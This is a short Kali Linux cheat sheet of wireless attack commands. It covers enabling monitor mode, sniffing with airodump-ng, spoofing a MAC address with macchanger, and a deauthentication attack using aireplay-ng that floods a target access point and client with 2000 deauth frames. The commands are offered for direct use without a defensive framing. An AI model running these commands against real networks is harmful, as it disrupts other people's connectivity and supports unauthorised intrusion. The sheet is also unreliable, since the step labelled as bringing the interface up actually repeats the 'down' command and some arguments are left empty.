# Kali-Linux-Commands

## Enabling Monitor Mode

* `iwconfig` : Show all network devices 
* `ifconfig wlan1 up` : To make sure network device is up and running 
* `airmon-ng` : Show all network cards 
* `airmon-ng check kill` : To prevent from disabling monitor mode 
* `airmon-ng start wlan1` : Start monitor mode 

## Reset to normal mode

* `airmon-ng stop wlan1mon` : Stop monitor mode
* `service network-manager start` : Restart network settings

## Sniffing Packets using airodump-ng

*PWR = Signal Strength should be above than -70*
* `airodump-ng wlan1mon` : Start sniffing
* `airodump-ng --bssid wlan1mon` :  Targeted sniffing


## macchanger

* `ifconfig wlan1 down` : Bring down the interface
* `macchanger -r wlan1` : Change mac address to random
* `ifconfig wlan1 down` : Bring the interface up

## Deauth Attacks

* `airodump-ng --channel --bssid  wlan1mon`
* `aireplay-ng --deauth 2000 -a [MAC of Access Point] [MAC of  Client] wlan1mon`







